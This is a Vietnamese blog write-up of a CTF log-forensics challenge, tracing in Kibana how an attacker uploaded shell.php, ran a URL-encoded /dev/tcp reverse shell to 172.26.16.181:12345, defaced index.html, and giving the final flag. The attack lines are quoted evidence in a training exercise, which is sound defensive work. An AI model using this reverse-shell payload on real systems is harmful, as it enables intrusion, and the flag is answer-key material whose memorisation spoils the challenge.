---
title: "Unexpected Behaviour"
date: 2026-01-25 12:00:00 +0700
categories: [CTF, Forensics]
tags: [log]
image:
  path: /assets/img/posts/Data_Stolen/banner.png
---

The SOC team was monitoring a production web server when they suddenly observed unusual and suspicious activities occurring on the system. Initial indicators suggested a potential security incident involving unauthorized file uploads and abnormal outbound connections. You are provided with a file named challenge.zip, which contains all the resources required to investigate this incident. Please extract the archive and follow the instructions in the included README.md file to set up the environment and complete the challenge.

1 thử thách khá thú vị đến từ VSL. File readme.md
```
### **Instructions**

1. Extract the challenge
2. Start the lab environment using Docker:
   `docker-compose up -d` or `docker compose up -d`
3. Once all containers are successfully running, open your browser and navigate to: `https://localhost:5601` with credential : `elastic/Vsl@2026`
4. In Kibana, go to Discovery and configure the following:

   - Index pattern: filebeat-*
   - Time range: Jan 22, 2026 @ 00:00:00.000 - Jan 22, 2026 @ 23:59:59.999
5. Analyze the logs carefully and answer all challenge questions to reconstruct the attacker’s activity and complete the flag.

   - **Part 1:** What is the name of the file uploaded by the attacker to the web server that enabled remote code execution? *(filename.extension)
   - **Part 2:** Which MITRE ATT&CK technique was used to escalate from file upload to remote code execution? *(Upload File → RCE, Txxx.xxx)
   - **Part 3:** Which IP address and port did the attacker attempt to connect to when establishing the reverse shell? *(IP:PORT)
   - **Part 4:** What is the name of the file that the attacker executed a command to write data into? *(filename.extension)*
   Flag Format: **VSL{Part1_Part2_Part3_Part4}**
```
Ta được đưa đến Elastic Stack, 1 SIEM
![alt text](/assets/img/posts/Unexpected_Behavior/image.png)

Lọc thời gian theo hướng dẫn, ta thấy có đến hơn 630k docs
![alt text](/assets/img/posts/Unexpected_Behavior/image-1.png)
Tuy nhiên, vì attackẻ có upload file lên server, ta sẽ lọc theo methoc POST

![alt text](/assets/img/posts/Unexpected_Behavior/image-2.png)

May mắn là chỉ có 5 POST. Trong đó 3 log đầu là đăng nhập login. 2 log sau ta thấy POST vào /admin. Trong đó, khoảng thời gian sớm nhất là Jan 22, 2026 @ 12:44:57.000. Ta sẽ lọc sau khoảng thời gian này.
Để tìm được file attacker upload để tạo RCE, ta lọc đường dẫn chứa php và status code = 200
![alt text](/assets/img/posts/Unexpected_Behavior/image-3.png)
Log giảm xuống chỉ 85 docs và ta đã thấy shell.
-> Part là shell.php
Tìm tiếp các docs tiếp theo, ta thấy được
```
"url.original.text": [
      "/public/imgs/Banner/shell.php?cmd=0%3C&196;exec%20196%3C%3E/dev/tcp/172.26.16.181/12345;%20sh%20%3C&196%20%3E&196%202%3E&196"
```
```
"url.original.text": [
      "/public/imgs/Banner/shell.php?cmd=echo%20%22Hacker%20access%20fully%22%20%3E%20index.html"
```
Tìm trên Mitre Att&ck
![alt text](/assets/img/posts/Unexpected_Behavior/image-4.png)
Ta có được flag VSL{shell.php_T1505.003_172.26.16.181:12345_index.html}